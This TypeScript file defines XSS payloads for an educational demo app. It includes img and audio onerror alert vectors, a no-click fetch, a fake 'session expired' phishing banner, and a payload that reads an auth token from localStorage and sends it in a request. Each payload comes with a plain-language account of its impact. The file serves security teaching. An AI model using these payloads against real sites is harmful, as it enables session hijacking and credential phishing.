/**
 * Educational XSS demo payloads — match docs/xss/01–03 and classic vectors.
 * Use only in this controlled demo app.
 */

export interface XssDemoExample {
  id: string
  title: string
  /** One-line summary for the card header area. */
  description: string
  /** Plain language: what this demo does when it runs (insecure route). */
  whatYouSee: string
  /** Plain language: real-world impact—same tone as “You would be phished here.” */
  whatCouldGoWrong: string
  /** Short label pointing to the write-up in docs/xss/ */
  docRef: string
  payload: string
}

/** Minimal classic vector: img onerror (see docs/xss/insecure-patterns.md). */
const CLASSIC_IMG_ALERT = '<img src="x" onerror="alert(\'Classic img onerror XSS\')">'

/**
 * Second classic: media tag + onerror (same idea as img).
 * Note: `<svg onload>` is often cited but does not reliably fire when HTML is
 * inserted via innerHTML / React `dangerouslySetInnerHTML`, so this demo uses
 * `<audio>` instead for a dependable “no click” alert.
 */
const CLASSIC_AUDIO_ONERROR =
  '<audio src="x" onerror="alert(\'Classic audio onerror XSS\')"></audio>'

/** docs/xss/01-actions-without-user-interaction.md */
const DOC_01_FETCH = `<img src=x onerror="
  fetch('https://dummyjson.com/todos/1')
    .then(r => r.json())
    .then(d => {
      document.body.insertAdjacentHTML(
        'beforeend',
        '<pre style=position:fixed;bottom:16px;right:16px;background:#111;color:#0f0;padding:16px;z-index:9999>'
        + JSON.stringify(d, null, 2) +
        '</pre>'
      )
    })
">`

/** docs/xss/02-internal-phishing.md */
const DOC_02_PHISHING = `<div style="
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  padding: 16px;
  background: #fff3cd;
  color: #664d03;
  border-bottom: 1px solid #ffecb5;
  font-family: Arial, sans-serif;
  z-index: 9999;
  display: flex;
  justify-content: space-between;
  align-items: center;
">
  <span>⚠️ Your session has expired. Please sign in again.</span>
  <button
    style="
      padding: 8px 12px;
      background: #1976d2;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
    "
    onclick="alert('You would be phished here')"
  >
    Login
  </button>
</div>`

/**
 * docs/xss/03-session-hijacking.md
 * Shows both the string read from localStorage and the API JSON so the leak is obvious.
 * DummyJSON returns 401 JSON for the demo token—that still proves the token was sent.
 */
const DOC_03_TOKEN = `<img src="x" onerror="
  fetch('https://dummyjson.com/auth/me', {
    headers: {
      Authorization: 'Bearer ' + localStorage.getItem('auth_token')
    }
  })
  .then(r => r.json())
  .then(data => {
    var token = localStorage.getItem('auth_token');
    document.body.insertAdjacentHTML(
      'beforeend',
      '<pre style=position:fixed;bottom:20px;right:20px;background:#222;color:#0f0;padding:16px;z-index:9999;max-width:min(520px,92vw);max-height:48vh;overflow:auto;font-size:12px;line-height:1.4>'
      + JSON.stringify(
        {
          stolenFromLocalStorage: token,
          authMeResponse: data
        },
        null,
        2
      ) +
      '</pre>'
    );
  })
">`

export const XSS_DEMO_EXAMPLES: XssDemoExample[] = [
  {
    id: 'classic-img',
    title: 'Classic: img onerror',
    description: 'Image fails to load; onerror runs immediately—no click.',
    whatYouSee:
      'As soon as you add the todo, an alert fires—you never clicked anything. That is the injected code running in your page.',
    whatCouldGoWrong:
      'An attacker could run any script as your site: read cookies or storage, call your APIs as the user, or redirect them—same mechanism, worse payload.',
    docRef: 'Patterns',
    payload: CLASSIC_IMG_ALERT,
  },
  {
    id: 'classic-audio',
    title: 'Classic: audio onerror',
    description:
      'Like img: invalid src fails load and onerror runs—works with innerHTML.',
    whatYouSee:
      'Same idea as img: the browser tries to load a bad URL, fails, and runs onerror. Here you get an alert the moment the todo appears.',
    whatCouldGoWrong:
      'Attackers try many tags (img, audio, video, …). If your app renders HTML unsafely, any working handler is enough to own the session.',
    docRef: 'Patterns',
    payload: CLASSIC_AUDIO_ONERROR,
  },
  {
    id: 'doc-01-fetch',
    title: 'No-click: fetch and show JSON',
    description: 'Runs on render: fetches a public API and injects a result panel.',
    whatYouSee:
      'Without a click, the page fetches sample JSON and draws a green box with the data—proving injected code can talk to the network from your origin.',
    whatCouldGoWrong:
      'In a real app, that code could call your private APIs, change settings, or POST stolen data to a server the attacker controls—still with no user click.',
    docRef: '01 — No user interaction',
    payload: DOC_01_FETCH,
  },
  {
    id: 'doc-02-phishing',
    title: 'Internal phishing banner',
    description: 'Fake “session expired” bar with a Login button (click for alert).',
    whatYouSee:
      'A convincing banner appears on your own domain. The Login button shows an alert that stands in for a phishing page or fake form.',
    whatCouldGoWrong:
      'Users trust your URL. A real attack would send them to a cloned login or harvest credentials—you would be phished here is the harmless stand-in.',
    docRef: '02 — Phishing',
    payload: DOC_02_PHISHING,
  },
  {
    id: 'doc-03-token',
    title: 'Session token from localStorage',
    description:
      'Reads auth_token (same as this app), shows the string, then the /auth/me JSON.',
    whatYouSee:
      'The green panel lists stolenFromLocalStorage (the real value from localStorage, e.g. fake_token_123) and authMeResponse from DummyJSON. The API error is normal—our token is not a real JWT—but you can see exactly what an attacker would steal and that it was sent on the request.',
    whatCouldGoWrong:
      'A real attacker would exfiltrate that token to their server and reuse it—session hijacking and account takeover start here.',
    docRef: '03 — Session hijacking',
    payload: DOC_03_TOKEN,
  },
]
